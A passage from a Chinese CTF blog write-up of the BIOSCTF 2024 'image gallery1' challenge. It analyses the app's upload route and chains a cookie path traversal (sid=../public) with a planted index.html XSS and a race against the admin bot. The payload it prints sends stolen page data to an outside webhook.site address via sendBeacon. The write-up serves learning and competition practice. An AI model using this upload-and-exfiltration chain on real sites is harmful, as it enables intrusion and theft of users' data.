    modalImage<span class="token punctuation">.</span>src <span class="token operator">=</span> file
    modal<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
    <span class="token keyword">const</span> gallery <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.gallery'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    gallery<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>tagName <span class="token operator">===</span> <span class="token string">'IMG'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">const</span> modal <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">bootstrap<span class="token punctuation">.</span>Modal</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'imageModal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> modalImage <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'modalImage'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">const</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"modelbutton"</span><span class="token punctuation">)</span>
        modalImage<span class="token punctuation">.</span>src <span class="token operator">=</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>src<span class="token punctuation">;</span>
        btn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
          <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/share'</span><span class="token punctuation">,</span><span class="token punctuation">{</span>
            method<span class="token punctuation">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
            headers<span class="token punctuation">:</span> <span class="token punctuation">{</span>
              <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span>
            <span class="token punctuation">}</span><span class="token punctuation">,</span>
            body<span class="token punctuation">:</span> JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span><span class="token punctuation">{</span>id <span class="token punctuation">:</span> e<span class="token punctuation">.</span>target<span class="token punctuation">.</span>src<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            credentials<span class="token punctuation">:</span> <span class="token string">"include"</span>
          <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>_ <span class="token operator">=</span><span class="token operator">></span> modal<span class="token punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span>
        modal<span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">%</span><span class="token operator">></span>
    <span class="token keyword">const</span> fileNames <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">'&lt;%= files %>'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>fileNames<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
          fileName <span class="token operator">=</span> fileNames<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
          <span class="token keyword">const</span> imgElement <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          imgElement<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token string">`/&lt;%= id %>/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>fileName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>

          imgElement<span class="token punctuation">.</span>alt <span class="token operator">=</span> <span class="token template-string"><span class="token string">`Image: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>fileName<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">;</span>

          galleryDiv<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>imgElement<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

  <span class="token operator">&lt;</span><span class="token operator">%</span> <span class="token punctuation">}</span> <span class="token operator">%</span><span class="token operator">></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这种直接给对象属性赋值的操作如果能逃逸感觉得是浏览器的洞了233。</p>
<p>访问根路由会根据你的<code>sid</code>读文件。</p>
<p><code>upload</code>那里<code>sid</code>可控，可以打个任意文件上传。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span><span class="token keyword">async</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span>res<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>files <span class="token operator">||</span> <span class="token operator">!</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
    <span class="token keyword">try</span><span class="token punctuation">{</span>
      <span class="token keyword">const</span> uploadedFile <span class="token operator">=</span> req<span class="token punctuation">.</span>files<span class="token punctuation">.</span>image<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>uploadedFile<span class="token punctuation">.</span>size <span class="token operator">></span> maxSizeInBytes<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File size exceeds the limit.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">await</span> uploadedFile<span class="token punctuation">.</span><span class="token function">mv</span><span class="token punctuation">(</span><span class="token template-string"><span class="token string">`./public/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>req<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>sid<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>uploadedFile<span class="token punctuation">.</span>name<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">{</span>
      <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid request'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>

  res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h5 id="index-html-XSS"><a href="#index-html-XSS" class="headerlink" title="index.html XSS"></a>index.html XSS</h5><p>题目给的附件里有个空的<code>public</code>。</p>
<p>并且设置了静态目录，而<code>bot</code>访问的正是根路由，所以只要写入<code>public/index.html</code>就可以在根目录实现<code>XSS</code>了。。。</p>
<pre class="line-numbers language-js"><code class="language-js">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token keyword">static</span><span class="token punctuation">(</span><span class="token string">'public'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>令<code>sid=../public</code>，上传个<code>index.html</code>测试。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709103008567.png" alt="1709103008567"></p>
<p>不过有个坑。题目设置了<code>httponly</code>，我们只能通过<code>bot</code>第二次访问<code>index.html</code>触发<code>js</code>拿第一次<code>bot</code>访问的<code>content</code>，然后再外带。如果一开始直接覆盖<code>index.html</code>那么<code>bot</code>第一次也拿不到<code>flag</code>的路径了。</p>
<p>而<code>bot</code>这里延迟三秒给了我们竞争的机会。</p>
<pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">3000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>第二个问题是假设我们第二次能<code>xss</code>了，但是如何拿到<code>bot</code>第一次访问的内容？</p>
<p>通过<code>window.history.back()</code>或者<code>window.history.go(-1)</code>即可。</p>
<h5 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>第一步点击<code>share</code>，此时<code>bot</code>访问首页拿到<code>flag</code>内容。</p>
<p>第二步马上上传<code>public/index.html</code>即可。</p>
<p><strong>index.html</strong></p>
<pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">
    <span class="token punctuation">(</span><span class="token keyword">async</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>opener<span class="token punctuation">)</span><span class="token punctuation">{</span>
            opener<span class="token punctuation">.</span>window<span class="token punctuation">.</span>history<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span>r<span class="token operator">=</span><span class="token operator">></span><span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            navigator<span class="token punctuation">.</span><span class="token function">sendBeacon</span><span class="token punctuation">(</span><span class="token string">'https://webhook.site/5d88d116-b5e8-4791-82f3-610e03b61ff4'</span><span class="token punctuation">,</span>opener<span class="token punctuation">.</span>window<span class="token punctuation">.</span>document<span class="token punctuation">.</span>document<span class="token punctuation">.</span><span class="token function">getElementsByTagName</span><span class="token punctuation">(</span><span class="token string">'img'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>src<span class="token punctuation">)</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'/?test'</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>拿到<code>flag</code>。</p>
<p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/1709104679525.png" alt="1709104679525"></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://www.squirt1e.top">Squirt1e</a></p><p> <span>Link:  </span><a href="http://www.squirt1e.top/2024/02/28/biosctf2024/">http://www.squirt1e.top/2024/02/28/biosctf2024/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2023/12/04/mutation-xss-tu-bian-xss/" title="从TPCTF之walk off the earth看mXSS"><span>NextPost ></span><br><span class="nextTitle">从TPCTF之walk off the earth看mXSS</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#requirenotes"><span class="toc-number">1.</span> <span class="toc-text">requirenotes</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F1"><span class="toc-number">1.1.</span> <span class="toc-text">非预期1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F2"><span class="toc-number">1.2.</span> <span class="toc-text">非预期2</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#requirenotes-revenge"><span class="toc-number">2.</span> <span class="toc-text">requirenotes-revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-number">2.1.</span> <span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A7%A3%EF%BC%88%E6%9C%AA%E5%88%86%E6%9E%90%E5%AE%8C%EF%BC%89"><span class="toc-number">2.2.</span> <span class="toc-text">预期解（未分析完）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.2.2.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9require%E7%BC%93%E5%AD%98"><span class="toc-number">2.2.3.</span> <span class="toc-text">修改require缓存</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#SSLEAK"><span class="toc-number">2.2.4.</span> <span class="toc-text">SSLEAK</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bad-notes"><span class="toc-number">3.</span> <span class="toc-text">bad_notes</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#image-gallery1"><span class="toc-number">4.</span> <span class="toc-text">image gallery1</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="toc-number">4.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#index-html-XSS"><span class="toc-number">4.2.</span> <span class="toc-text">index.html XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">4.3.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>